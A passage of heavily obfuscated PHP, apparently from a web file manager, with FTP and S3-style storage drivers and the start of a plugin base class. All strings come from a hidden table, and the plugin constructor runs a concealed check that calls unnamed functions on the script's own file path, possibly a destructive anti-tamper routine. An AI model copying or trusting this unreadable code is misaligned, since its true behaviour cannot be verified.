Í[1453]; $this->port = isset($ş…û«ğ÷[$šÜõÀ Í[209]]) ? $ş…û«ğ÷[$šÜõÀ Í[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($šÜõÀ Í[1454]) . $this->host . $šÜõÀ Í[4] . $this->port, !0); return !1; } $ıß¥¿ıÇ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ıß¥¿ıÇ) { $this->writeLog(LNG($šÜõÀ Í[1455]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¢ş­µ¹Â = $this->pasv == $šÜõÀ Í[91] ? !0 : !1; @ftp_pasv($this->connect, $¢ş­µ¹Â); $¨šãº[$ÓØÓ“·Ó] = array($šÜõÀ Í[1456] => $this->connect, $šÜõÀ Í[208] => $this->host, $šÜõÀ Í[207] => $this->scheme, $šÜõÀ Í[209] => $this->port); return $ıß¥¿ıÇ; } private function _isconn($ëÅÍß²ü = true) { if (is_resource($this->connect)) { return !0; } if (!$ëÅÍß²ü) { return !1; } return $this->_login($this->config); } public function mkfile($¯•—äÚ™, $òÜ®Ú¹Œ = '', $€Â’ = REPEAT_RENAME) { if ($this->setContent($¯•—äÚ™, $òÜ®Ú¹Œ)) { return $this->getPathOuter($¯•—äÚ™); } $this->writeLog(LNG($_SERVER[§Êá¸İ][1457]), !0); return !1; } public function mkdir($·çÎõığ, $ûÕÁô¸ã = REPEAT_SKIP) { $Ù†Î·ò· =& $_SERVER[§Êá¸İ]; if (!$·çÎõığ || $·çÎõığ == $Ù†Î·ò·[8]) { return !0; } if (!$this->_isconn()) { return !1; } $·çÎõığ = $this->iconvSystem($·çÎõığ); if ($this->_isFolder($·çÎõığ) || @ftp_mkdir($this->connect, $·çÎõığ)) { return $this->getPathOuter($·çÎõığ); } if (!$this->mkdir($this->pathFather($·çÎõığ))) { return !1; } if ($·çÎõığ = @ftp_mkdir($this->connect, $·çÎõığ)) { return $this->getPathOuter($·çÎõığ); } $this->writeLog(__FUNCTION__ . $Ù†Î·ò·[1458], !0); return !1; } public function copyFile($ÊïÇ™š¢, $×ÉÆ®Š±) { if (!$this->_isconn()) { return !1; } $ÌßÚ©ì = $this->pathThis($this->iconvSystem($ÊïÇ™š¢)); $Ò¨Ë€³ = $this->tempFile($ÌßÚ©ì); $Æ·åÜÒª = $this->iconvApp($Ò¨Ë€³); $this->download($ÊïÇ™š¢, $Æ·åÜÒª); $•½Œ•˜Æ = $this->upload($×ÉÆ®Š±, $Æ·åÜÒª); $this->tempFileRemve($Ò¨Ë€³); return $•½Œ•˜Æ; } public function moveFile($àĞÃ™îò, $éµÓî) { if (!$this->_isconn()) { return !1; } $àĞÃ™îò = $this->iconvSystem($àĞÃ™îò); $éµÓî = $this->iconvSystem($éµÓî); $¨¼ü¥½Ö = @ftp_rename($this->connect, $àĞÃ™îò, $éµÓî); if (!$¨¼ü¥½Ö) { $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][1458], !0); return !1; } return $this->getPathOuter($éµÓî); } public function delFile($ßì¤”Ô³) { if (!$this->_isconn()) { return !1; } $ßì¤”Ô³ = $this->iconvSystem($ßì¤”Ô³); $×—àá¤ = @ftp_delete($this->connect, $ßì¤”Ô³); if (!$×—àá¤) { $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][1458], !0); } return $×—àá¤; } public function delFolder($ˆ”ş×‘Ã) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ó—şã§º = $ÅîıÁ = array(); $this->fileList($ˆ”ş×‘Ã, $ó—şã§º, $ÅîıÁ, !0); $this->listItemCache = !0; foreach ($ÅîıÁ as $ìü”±­Ğ) { $Îµ„öì¤ = $this->iconvSystem($ìü”±­Ğ[$_SERVER[§Êá¸İ][32]]); $¼Ö¥†íõ = @ftp_delete($this->connect, $Îµ„öì¤); if (!$¼Ö¥†íõ) { return !1; } } foreach ($ó—şã§º as $Îµ„öì¤) { $Îµ„öì¤ = $this->iconvSystem($Îµ„öì¤); $¼Ö¥†íõ = @ftp_rmdir($this->connect, $Îµ„öì¤); if (!$¼Ö¥†íõ) { return !1; } } $ˆ”ş×‘Ã = $this->iconvSystem($ˆ”ş×‘Ã); return @ftp_rmdir($this->connect, $ˆ”ş×‘Ã); } public function rename($À˜˜ë€, $“¡‹€•Ş) { $Îš³Îêï =& $_SERVER[§Êá¸İ]; if (!$this->_isconn()) { return !1; } $Ïã²ç¬Æ = $this->fileNameAuto($this->pathFather($À˜˜ë€), $“¡‹€•Ş); $Ïã²ç¬Æ = $this->iconvSystem($Ïã²ç¬Æ); $À˜˜ë€ = $this->iconvSystem($À˜˜ë€); $İ‘“ê‡Ä = $this->pathFather($À˜˜ë€); $ñÜìØ™ä = rtrim($İ‘“ê‡Ä, $Îš³Îêï[8]) . $Îš³Îêï[8] . $Ïã²ç¬Æ; $¼ãóäÍ± = @ftp_rename($this->connect, $À˜˜ë€, $ñÜìØ™ä); if (!$¼ãóäÍ±) { $this->writeLog(__FUNCTION__ . $Îš³Îêï[1458], !0); return !1; } $ñÜìØ™ä = $this->iconvApp($ñÜìØ™ä); return $this->getPathOuter($ñÜìØ™ä); } private function folderInfo($µõ±Ö¤‰, $…ïˆÉÛĞ = false) { $š‹ÜõÓØ =& $_SERVER[§Êá¸İ]; $‚Ú°ìÖ = array($š‹ÜõÓØ[32] => $this->pathThis($µõ±Ö¤‰), $š‹ÜõÓØ[87] => $this->getPathOuter($š‹ÜõÓØ[8] . $µõ±Ö¤‰), $š‹ÜõÓØ[33] => $š‹ÜõÓØ[78]); if ($…ïˆÉÛĞ) { return $‚Ú°ìÖ; } $‚Ú°ìÖ[$š‹ÜõÓØ[231]] = $‚Ú°ìÖ[$š‹ÜõÓØ[88]] = 0; $‚Ú°ìÖ[$š‹ÜõÓØ[232]] = $‚Ú°ìÖ[$š‹ÜõÓØ[233]] = !0; return $‚Ú°ìÖ; } private function fileInfo($íáåé®ä, $ÚÆ ë«¿ = false, $Œß„ï¢ = array()) { $ÜØêåşï =& $_SERVER[§Êá¸İ]; $Šì§Âé¶ = array($ÜØêåşï[32] => $this->pathThis($íáåé®ä), $ÜØêåşï[87] => $this->getPathOuter($ÜØêåşï[8] . $íáåé®ä), $ÜØêåşï[33] => $ÜØêåşï[230], $ÜØêåşï[79] => isset($Œß„ï¢[$ÜØêåşï[79]]) ? $Œß„ï¢[$ÜØêåşï[79]] : 0, $ÜØêåşï[169] => $this->ext($íáåé®ä)); if ($ÚÆ ë«¿) { return $Šì§Âé¶; } $Šì§Âé¶[$ÜØêåşï[231]] = $Šì§Âé¶[$ÜØêåşï[88]] = 0; $Šì§Âé¶[$ÜØêåşï[232]] = $Šì§Âé¶[$ÜØêåşï[233]] = !0; $İéÊ¹¢õ = $this->iconvSystem($íáåé®ä); $Šì§Âé¶[$ÜØêåşï[88]] = @ftp_mdtm($this->connect, $İéÊ¹¢õ); if (empty($Œß„ï¢)) { $Œß„ï¢ = $this->objectMeta($íáåé®ä); if (!$Œß„ï¢) { return $Šì§Âé¶; } } $Šì§Âé¶[$ÜØêåşï[79]] = $Œß„ï¢[$ÜØêåşï[79]]; return $Šì§Âé¶; } public function size($ÕÙŞİ¦ë) { $¢ùÁ»ëè = $this->objectMeta($ÕÙŞİ¦ë); return $¢ùÁ»ëè ? $¢ùÁ»ëè[$_SERVER[§Êá¸İ][79]] : 0; } public function info($»ÈŞõÖ™) { if ($this->isFile($»ÈŞõÖ™)) { return $this->fileInfo($»ÈŞõÖ™, 0); } else { if ($this->isFolder($»ÈŞõÖ™)) { return $this->folderInfo($»ÈŞõÖ™); } } return !1; } private function fileList($ÉÈî´¸Ù, &$¶Ä»ÎäÕ, &$×ï˜Éß¢, $¬ê·ÍÀŒ = false) { $ø×îµùÃ =& $_SERVER[§Êá¸İ]; $ÉÈî´¸Ù = $this->iconvSystem($ÉÈî´¸Ù); if (!$this->isFolder($ÉÈî´¸Ù)) { return !1; } @ftp_chdir($this->connect, $ø×îµùÃ[8]); $ÉÈî´¸Ù = rtrim($ÉÈî´¸Ù, $ø×îµùÃ[8]) . $ø×îµùÃ[8]; check_abort(); $ß´ñ Å = @ftp_rawlist($this->connect, $ÉÈî´¸Ù); if (!$ß´ñ Å) { $ß´ñ Å = array(); } $›¼ö–¢µ = array($ø×îµùÃ[10] => 1, $ø×îµùÃ[1373] => 1); foreach ($ß´ñ Å as $ä ³À’ì) { $ö¨›º¡¸ = $this->_listItem($ä ³À’ì); if ($ö¨›º¡¸[0] == $ø×îµùÃ[845]) { continue; } $¯ˆµëİ = $ö¨›º¡¸[8]; if (empty($¯ˆµëİ) && $¯ˆµëİ !== $ø×îµùÃ[228] || isset($›¼ö–¢µ[$¯ˆµëİ])) { continue; } $¯ˆµëİ = $this->iconvApp($ÉÈî´¸Ù . ltrim($¯ˆµëİ, $ø×îµùÃ[8])); $àù…ƒ®ı = array($ø×îµùÃ[32] => $¯ˆµëİ, $ø×îµùÃ[33] => $ø×îµùÃ[230], $ø×îµùÃ[79] => $ö¨›º¡¸[4]); if (substr($ä ³À’ì, 0, 1) == $ø×îµùÃ[1459]) { $àù…ƒ®ı[$ø×îµùÃ[33]] = $ø×îµùÃ[78]; $àù…ƒ®ı[$ø×îµùÃ[79]] = 0; } $†¼Ù‹®ó = $àù…ƒ®ı[$ø×îµùÃ[33]] == $ø×îµùÃ[78] ? !0 : !1; $this->cacheMethodInfoSet($¯ˆµëİ, $†¼Ù‹®ó, $àù…ƒ®ı); if ($†¼Ù‹®ó) { $¶Ä»ÎäÕ[] = $¯ˆµëİ; if ($¬ê·ÍÀŒ) { $this->fileList($¯ˆµëİ, $¶Ä»ÎäÕ, $×ï˜Éß¢, $¬ê·ÍÀŒ); } continue; } $×ï˜Éß¢[] = $àù…ƒ®ı; } $this->cacheMethodInfoSet($ÉÈî´¸Ù, !0); } private function _listItem($²Ç£„ğò) { if (empty($²Ç£„ğò)) { return array(); } $˜›Ñªİ© = preg_split($_SERVER[§Êá¸İ][1460], $²Ç£„ğò); if (count($˜›Ñªİ©) <= 9) { return $˜›Ñªİ©; } $˜›Ñªİ©[8] = trim(substr($²Ç£„ğò, strpos($²Ç£„ğò, $˜›Ñªİ©[7]) + strlen($˜›Ñªİ©[7]))); return array_splice($˜›Ñªİ©, 0, 9); } public function listPath($ô›æş‰°, $Í•ÓÕËŞ = false) { $ëäò‡Æ– =& $_SERVER[§Êá¸İ]; if (!$this->_isconn()) { return !1; } $«›Âœ“ = $Äƒ„–ß– = array(); $this->fileList($ô›æş‰°, $«›Âœ“, $Äƒ„–ß–); foreach ($«›Âœ“ as $¶º©éëë => $ùìæ­Ì) { $«›Âœ“[$¶º©éëë] = $this->folderInfo($ùìæ­Ì, $Í•ÓÕËŞ); } foreach ($Äƒ„–ß– as $¶º©éëë => $ùìæ­Ì) { $Äƒ„–ß–[$¶º©éëë] = $this->fileInfo($ùìæ­Ì[$ëäò‡Æ–[32]], $Í•ÓÕËŞ, $ùìæ­Ì); } return array($ëäò‡Æ–[85] => $«›Âœ“, $ëäò‡Æ–[86] => $Äƒ„–ß–); } public function has($Ü’´Éâ, $üî¢ƒŞ¬ = false, $¦ÉÂ—ƒÑ = true) { $ıæ×—Ç =& $_SERVER[§Êá¸İ]; $öÍíæ™ñ = $Ÿ°Ò²¡ = array(); $€›„Äî” = $üî¢ƒŞ¬ ? !0 : !1; $this->fileList($Ü’´Éâ, $öÍíæ™ñ, $Ÿ°Ò²¡, $€›„Äî”); if ($üî¢ƒŞ¬) { return array($ıæ×—Ç[239] => count($Ÿ°Ò²¡), $ıæ×—Ç[240] => count($öÍíæ™ñ)); } if ($¦ÉÂ—ƒÑ) { if (count($Ÿ°Ò²¡)) { return !0; } } else { if (count($öÍíæ™ñ)) { return !0; } } return !1; } public function listAll($š×Ğ¼®¹) { $áÔı× =& $_SERVER[§Êá¸İ]; if (!$this->_isconn()) { return !1; } $Ó©÷ˆ¤¼ = $è ğÅŞ = array(); $this->fileList($š×Ğ¼®¹, $Ó©÷ˆ¤¼, $è ğÅŞ, !0); $Ş£¦· ÷ = array_to_keyvalue($è ğÅŞ, $áÔı×[32]); foreach ($Ó©÷ˆ¤¼ as $£“©éÔ÷) { if (is_string($£“©éÔ÷)) { $Ş£¦· ÷[$£“©éÔ÷] = array($áÔı×[79] => 0); } } return $this->listAllFiles($š×Ğ¼®¹, $Ş£¦· ÷); } public function getContent($ãÀŠ§”) { if (!$this->_isconn()) { return !1; } $ãÀŠ§” = $this->iconvSystem($ãÀŠ§”); return $this->fileSubstr($ãÀŠ§”); } public function setContent($ˆËœ÷ºÛ, $ö Ç«¦Ä = '') { if (!$this->_isconn()) { return !1; } $ÓíÒÕ°È = $this->pathThis($this->iconvSystem($ˆËœ÷ºÛ)); $Ò »Ìî = $this->tempFile($ÓíÒÕ°È); file_put_contents($Ò »Ìî, $ö Ç«¦Ä); $ëÅ©ÍĞ = $this->upload($ˆËœ÷ºÛ, $this->iconvApp($Ò »Ìî)); $this->tempFileRemve($Ò »Ìî); return $ëÅ©ÍĞ; } public function fileSubstr($Í²·øæá, $Ì×İáËÈ = 0, $Êµ‡Ñ¬Â = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Í²·øæá, $Ì×İáËÈ, $Êµ‡Ñ¬Â); } private function ftpRequest($å ÉÅ·û, $ÛÑŒ·ƒ = 0, $ÈÀ¹Ì Ù = false) { $å ÉÅ·û = $this->iconvSystem($å ÉÅ·û); $ùùäŞä– = $this->scheme . $this->host . $_SERVER[§Êá¸İ][4] . $this->port; $ÅÉ§½‰Ò = curl_init(); curl_setopt($ÅÉ§½‰Ò, CURLOPT_URL, $ùùäŞä– . $this->pathEncode($å ÉÅ·û)); curl_setopt($ÅÉ§½‰Ò, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ÈÀ¹Ì Ù) { $×†Õ¢· = $ÛÑŒ·ƒ + $ÈÀ¹Ì Ù - 1; curl_setopt($ÅÉ§½‰Ò, CURLOPT_RANGE, "{$ÛÑŒ·ƒ}\x2d{$×†Õ¢·}"); } curl_setopt($ÅÉ§½‰Ò, CURLOPT_RETURNTRANSFER, 1); $öâ¬©Øş = curl_exec($ÅÉ§½‰Ò); curl_close($ÅÉ§½‰Ò); return $öâ¬©Øş; } public function upload($ÀŒ¼Ø°´, $ôŠŸ³¦Ò, $•¥Á­áÊ = false, $Ì°Óûç = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ÀŒ¼Ø°´))) { return !1; } $ÀŒ¼Ø°´ = $this->iconvSystem($ÀŒ¼Ø°´); $ôŠŸ³¦Ò = $this->iconvSystem($ôŠŸ³¦Ò); $è¬ğ• = ftp_nb_put($this->connect, $ÀŒ¼Ø°´, $ôŠŸ³¦Ò, FTP_BINARY); while ($è¬ğ• == FTP_MOREDATA) { $è¬ğ• = ftp_nb_continue($this->connect); } if ($è¬ğ• != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][1458], !0); return !1; } return $this->getPathOuter($ÀŒ¼Ø°´); } public function download($õğá³¡«, $ÒşÇÆÙÅ = '') { if (!$this->_isconn()) { return !1; } $ú†ƒØáš = $this->pathFather($ÒşÇÆÙÅ); if (!IO::mkdir($ú†ƒØáš)) { return !1; } $õğá³¡« = $this->iconvSystem($õğá³¡«); $ÒşÇÆÙÅ = $this->iconvSystem($ÒşÇÆÙÅ); $’ò¹ã†· = ftp_nb_get($this->connect, $ÒşÇÆÙÅ, $õğá³¡«, FTP_BINARY); while ($’ò¹ã†· == FTP_MOREDATA) { $’ò¹ã†· = ftp_nb_continue($this->connect); } if ($’ò¹ã†· != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][1458], !0); return !1; } return $this->iconvApp($ÒşÇÆÙÅ); } public function exist($±ı±Ö°¥) { return $this->isFile($±ı±Ö°¥) || $this->isFolder($±ı±Ö°¥); } public function isFile($–‚ºßş) { return !$this->isFolder($–‚ºßş) && $this->objectMeta($–‚ºßş); } public function isFolder($¬×ğßï³) { return $this->cacheMethod($_SERVER[§Êá¸İ][179], $¬×ğßï³); } protected function objectMeta($ÅÅÂ‚Àõ) { return $this->cacheMethod($_SERVER[§Êá¸İ][181], $ÅÅÂ‚Àõ); } protected function _objectMeta($ø¿²ƒ‘ô) { $ÌŒŒßÄ¿ =& $_SERVER[§Êá¸İ]; if ($ø¿²ƒ‘ô == $ÌŒŒßÄ¿[12] || $ø¿²ƒ‘ô == $ÌŒŒßÄ¿[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ø¿²ƒ‘ô = $this->iconvSystem($ø¿²ƒ‘ô); $ú·Ëûì = array($ÌŒŒßÄ¿[32] => $this->iconvApp($ø¿²ƒ‘ô), $ÌŒŒßÄ¿[33] => $ÌŒŒßÄ¿[230], $ÌŒŒßÄ¿[79] => 0); @ftp_chdir($this->connect, $ÌŒŒßÄ¿[8]); $ˆï¦¸ŸĞ = @ftp_size($this->connect, $ø¿²ƒ‘ô); if ($ˆï¦¸ŸĞ != -1) { $ú·Ëûì[$ÌŒŒßÄ¿[79]] = $ˆï¦¸ŸĞ; } else { $Çä™û—ü = @ftp_chdir($this->connect, $ø¿²ƒ‘ô); if (!$Çä™û—ü) { return !1; } $ú·Ëûì[$ÌŒŒßÄ¿[33]] = $ÌŒŒßÄ¿[78]; } return $ú·Ëûì; } protected function _isFolder($ıÄüí×) { $”¬ªãûÈ =& $_SERVER[§Êá¸İ]; if ($ıÄüí× == $”¬ªãûÈ[12] || $ıÄüí× == $”¬ªãûÈ[8]) { return !0; } $ú‰ª«ªø = $this->_objectMeta($ıÄüí×); return isset($ú‰ª«ªø[$”¬ªãûÈ[33]]) && $ú‰ª«ªø[$”¬ªãûÈ[33]] == $”¬ªãûÈ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($à¥‡±ûó) { parent::__construct($à¥‡±ûó); $this->setSignVersion($_SERVER[§Êá¸İ][247]); } public function uploadLink($®œÓ’ı, $­ı‹šøä = 0) { $íô…ÓÕ© =& $_SERVER[§Êá¸İ]; if ($this->isUploadServer()) { return; } $‘ÔÇÍÇ = $this->getType(); if (!in_array($‘ÔÇÍÇ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ş…­•»ë = (!$­ı‹šøä ? 1 : ceil($­ı‹šøä / pow(1024, 3))) * 3600 * 4; $Ğ½Ï¶Í÷ = $this->multiUploadFormData($®œÓ’ı, $Ş…­•»ë); if ($Ğ½Ï¶Í÷) { $Ğ½Ï¶Í÷[$íô…ÓÕ©[97]] = $®œÓ’ı; $Ğ½Ï¶Í÷[$íô…ÓÕ©[98]] = $‘ÔÇÍÇ; } return $Ğ½Ï¶Í÷; } public function fileOutImage($öÙ‡ÏÏ°, $ıĞí‘¸ = 250) { if ($this->size($öÙ‡ÏÏ°) > 1024 * 1024 * 25) { return $this->fileOutImageServer($öÙ‡ÏÏ°, $ıĞí‘¸); } $”ğü°ïò = $this->link($öÙ‡ÏÏ°); $”ğü°ïò .= $_SERVER[§Êá¸İ][1461] . $ıĞí‘¸; $this->fileOutLink($”ğü°ïò); } public function fileOutLink($Ü˜‰Á ) { $§äŞÙËŒ =& $_SERVER[§Êá¸İ]; if (substr($Ü˜‰Á , 0, 7) == $§äŞÙËŒ[313]) { $Ü˜‰Á  = $§äŞÙËŒ[314] . substr($Ü˜‰Á , 7); } header($§äŞÙËŒ[175] . $Ü˜‰Á ); die; } } goto FÁòŒˆé†Ï; B¾„Ç‰Öğè: class Message { function __construct() { } public function send($úƒ­¯¤ = '', $šµœ“Ä = array(), $üõÂĞ¬¢ = "\164\x65\x78\164") { $Û£¶„õ‹ =& $_SERVER[§Êá¸İ]; $œ»ºø’õ = array($Û£¶„õ‹[33] => $Û£¶„õ‹[1630], $Û£¶„õ‹[171] => $úƒ­¯¤); if (in_array($üõÂĞ¬¢, array($Û£¶„õ‹[1630], $Û£¶„õ‹[1631]))) { $œ»ºø’õ[$Û£¶„õ‹[33]] = $üõÂĞ¬¢; } $šµœ“Ä = array($Û£¶„õ‹[586] => isset($šµœ“Ä[$Û£¶„õ‹[586]]) ? $šµœ“Ä[$Û£¶„õ‹[586]] : $Û£¶„õ‹[12], $Û£¶„õ‹[670] => isset($šµœ“Ä[$Û£¶„õ‹[670]]) ? $šµœ“Ä[$Û£¶„õ‹[670]] : $Û£¶„õ‹[12]); if (empty($úƒ­¯¤) || empty($šµœ“Ä[$Û£¶„õ‹[586]]) && empty($šµœ“Ä[$Û£¶„õ‹[670]])) { return !1; } $ùèó‰ÇÃ = array($Û£¶„õ‹[1558] => $œ»ºø’õ, $Û£¶„õ‹[1632] => $šµœ“Ä); Hook::trigger($Û£¶„õ‹[1633], $ùèó‰ÇÃ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¬ºØ›†Ç =& $_SERVER[§Êá¸İ]; if ($_SERVER[$¬ºØ›†Ç[472]] != $_SERVER[$¬ºØ›†Ç[1001]]) { $ÒØ¢³¦… = $¬ºØ›†Ç[964]; $ıØ£¼õ± = $¬ºØ›†Ç[474]; $Œöö¦üŸ = $_SERVER[$¬ºØ›†Ç[475]] . $¬ºØ›†Ç[476]; $‘ ¼Ş¿¢ = $ıØ£¼õ±($Œöö¦üŸ); $Ã¶æµı = explode($¬ºØ›†Ç[262], $‘ ¼Ş¿¢); if (count($Ã¶æµı) < $¬ºØ›†Ç[700]) { $İ¡Âõ´ò = $¬ºØ›†Ç[478]; $İ¡Âõ´ò(); } $ô©ª¨ô = $¬ºØ›†Ç[965]; $ô©ª¨ô($_SERVER[$¬ºØ›†Ç[966]]); $ô©ª¨ô($_SERVER[$¬ºØ›†Ç[475]] . $¬ºØ›†Ç[1634]); $Ë§ì´„‰ = 1; while ($Ë§ì´„‰ > 1) { $Ë§ì´„‰ = $Ë§ì´„‰ + 4; $‹Ã›ÂÎ´ = rawurlencode($Ë§ì´„‰ . $¬ºØ›†Ç[454]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¬ºØ›†Ç[1635]); $this->pluginName = str_replace($¬ºØ›†Ç[1635], $¬ºØ›†Ç[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¬ºØ›†Ç[8]; $this->pluginApi = appHostGet() . $¬ºØ›†Ç[1636] . $this->pluginName . $¬ºØ›†Ç[8]; $this->pluginHost = $config[$¬ºØ›†Ç[1637]] . $this->pluginName . $¬ºØ›†Ç[8]; $this->pluginHostDefault = $config[$¬ºØ›†Ç[1637]] . $this->pluginName . $¬ºØ›†Ç[8]; $š»¬ÄÆä = $config[$¬ºØ›†Ç[1638]]; if ($š»¬ÄÆä && strpos($¬ºØ›†Ç[50] . $š»¬ÄÆä . $¬ºØ›†Ç[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¬ºØ›†Ç[1639]] . $this->pluginName . $¬ºØ›†Ç[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[§Êá¸İ][1640]); } protected function assign($ûœ¦›£ó, $âñìØÜ³ = false) { if (is_array($ûœ¦›£ó)) { $this->values = array_merge($this->values, $ûœ¦›£ó); } else { $this->values[$ûœ¦›£ó] = $âñìØÜ³; } } protected function display($£å¦»åÒ) { extract($this->values); require $£å¦»åÒ; } final function hookRegist($Ûò¿ø˜½) { $this->modelPlugin->appRegist($this->pluginName, $Ûò¿ø˜½); } final function appIcon() { $ô¯™‘œš =& $_SERVER[§Êá¸İ]; $ƒ²ü—“á = $this->appPackage(); $»ü¬¸œæ = $ô¯™‘œš[12]; if (isset($ƒ²ü—“á[$ô¯™‘œš[498]])) { if (isset($ƒ²ü—“á[$ô¯™‘œš[498]][$ô¯™‘œš[1641]])) { $»ü¬¸œæ = $ô¯™‘œš[1642] . $ƒ²ü—“á[$ô¯™‘œš[498]][$ô¯™‘œš[1641]] . $ô¯™‘œš[1643]; } else { if ($ƒ²ü—“á[$ô¯™‘œš[498]][$ô¯™‘œš[1644]]) { $»ü¬¸œæ = $ô¯™‘œš[1645] . $ƒ²ü—“á[$ô¯™‘œš[498]][$ô¯™‘œš[1644]] . $ô¯™‘œš[1646]; } } } return $»ü¬¸œæ; } final function fileCanView($ÍæÁÆş) { $ÖÕá¬œ“ =& $_SERVER[§Êá¸İ]; if (request_url_safe($ÍæÁÆş)) { return !0; } if ($this->isShare($ÍæÁÆş)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $À±ßê‚ï = $ÖÕá¬œ“[1647] . rawurlencode(this_url()); show_tips(LNG($ÖÕá¬œ“[1648]) . $ÖÕá¬œ“[1649] . $À±ßê‚ï . $ÖÕá¬œ“[1650] . LNG($ÖÕá¬œ“[1651]) . $ÖÕá¬œ“[1652], !1); } if (!Action($ÖÕá¬œ“[1653])->authCan($ÖÕá¬œ“[1654])) { show_tips(LNG($ÖÕá¬œ“[1655]) . $ÖÕá¬œ“[1656], !1); } ActionCall($ÖÕá¬œ“[1657], $ÍæÁÆş); } final function isShare($í‹âş¼„) { $Ôç•ÓŸ÷ = KodIO::parse($í‹âş¼„); return $Ôç•ÓŸ÷[$_SERVER[§Êá¸İ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($íŠÓÍŞì) { if (request_url_safe($íŠÓÍŞì)) { return $íŠÓÍŞì; } if (!$this->isShare($íŠÓÍŞì)) { $íŠÓÍŞì = $this->filePath($íŠÓÍŞì, !1); } return Action($_SERVER[§Êá¸İ][1266])->linkOut($íŠÓÍŞì); } public function filePathLinkOut($Ÿˆˆ) { if (request_url_safe($Ÿˆˆ)) { return $Ÿˆˆ; } $this->fileCanView($Ÿˆˆ); return Action($_SERVER[§Êá¸İ][1266])->link($Ÿˆˆ); } final function filePath($Ú¿€ôó, $¢´Ú« = true, $§»Ì„‚ç = false) { $à¨¯Ñº =& $_SERVER[§Êá¸İ]; $çõ‰‹úŠ = $this->filePathGet($Ú¿€ôó, $¢´Ú«); if (!$this->fileInfo) { show_tips(LNG($à¨¯Ñº[108]), !1); } if ($§»Ì„‚ç && isset($this->fileInfo[$à¨¯Ñº[549]]) && $this->fileInfo[$à¨¯Ñº[549]]) { $üŸöÒå³ = Model($à¨¯Ñº[552])->fileInfo($this->fileInfo[$à¨¯Ñº[549]]); if (!$üŸöÒå³ || !IO::exist($üŸöÒå³[$à¨¯Ñº[87]])) { show_tips(LNG($à¨¯Ñº[108]) . $à¨¯Ñº[1658]); } } Hook::trigger($à¨¯Ñº[1659], $çõ‰‹úŠ); return $çõ‰‹úŠ; } final function filePathGet($Îùó¤Áº, $ Õí¢… = true) { $³¦®ÁŞ’ =& $_SERVER[§Êá¸İ]; if ($ãŠíÉ²· = $this->checkSharePath($Îùó¤Áº, $ Õí¢…)) { return $ãŠíÉ²·; } $this->fileCanView($Îùó¤Áº); if (request_url_safe($Îùó¤Áº)) { $ “…¹İ = parse_url_query($Îùó¤Áº); if (isset($ “…¹İ[$³¦®ÁŞ’[1660]]) && isset($ “…¹İ[$³¦®ÁŞ’[234]])) { $“Ç‰Ÿã“ = Mcrypt::decode($ “…¹İ[$³¦®ÁŞ’[234]], Model($³¦®ÁŞ’[857])->get($³¦®ÁŞ’[858])); if ($“Ç‰Ÿã“) { $this->fileInfo = IO::info($“Ç‰Ÿã“); $this->fileInfo[$³¦®ÁŞ’[1661]] = $Îùó¤Áº; $this->cachePath = $this->pluginCachePath($³¦®ÁŞ’[12], $ Õí¢…); return $“Ç‰Ÿã“; } } $Îùó¤Áº = $this->_cacheHttpFile($Îùó¤Áº, $ Õí¢…); $this->fileInfo = IO::info($Îùó¤Áº); } else { $this->fileInfo = IO::info($Îùó¤Áº); $this->cachePath = $this->pluginCachePath($³¦®ÁŞ’[12], $ Õí¢…); } return $Îùó¤Áº; } final function _cacheHttpFile($æâ³†èë, $£¹½Ã¯ = true) { $¸êò–‚­ =& $_SERVER[§Êá¸İ]; $öàĞøÙÊ = parse_url_query($æâ³†èë); $Ó¦¼¨¦ = get_path_ext($æâ³†èë); if (isset($öàĞøÙÊ[$¸êò–‚­[32]]) && $öàĞøÙÊ[$¸êò–‚­[32]]) { $Ó¦¼¨¦ = get_path_ext($öàĞøÙÊ[$¸êò–‚­[32]]); } $ÃğÁá¿­ = hash_path($æâ³†èë) . $¸êò–‚­[10] . $Ó¦¼¨¦; $this->cachePath = $this->pluginCachePath($£¹½Ã¯ ? $ÃğÁá¿­ : $¸êò–‚­[12]); $•Ø¿³÷ë = IO::fileNameExist($this->cachePath, $ÃğÁá¿­); if ($•Ø¿³÷ë) { return KodIO::make($•Ø¿³÷ë); } $‡©®òÔÙ = rtrim($this->cachePath, $¸êò–‚­[8]) . $¸êò–‚­[8] . $ÃğÁá¿­; return $this->pluginCacheFileSet($‡©®òÔÙ, file_get_contents_nossl($æâ³†èë)); } final function checkSharePath($Ò³È§, $›é‹Ğè = true) { $»óšĞ¦ø =& $_SERVER[§Êá¸İ]; if (!$this->isShare($Ò³È§)) { return !1; } $„¥ã¹·£ = Action($»óšĞ¦ø[1266])->sharePathInfo($Ò³È§); if (!is_array($„¥ã¹·£) || !isset($„¥ã¹·£[$»óšĞ¦ø[87]])) { show_json(LNG($»óšĞ¦ø[1662]), !1); } $this->fileInfo = $„¥ã¹·£; $this->cachePath = $this->pluginCachePath(!1, 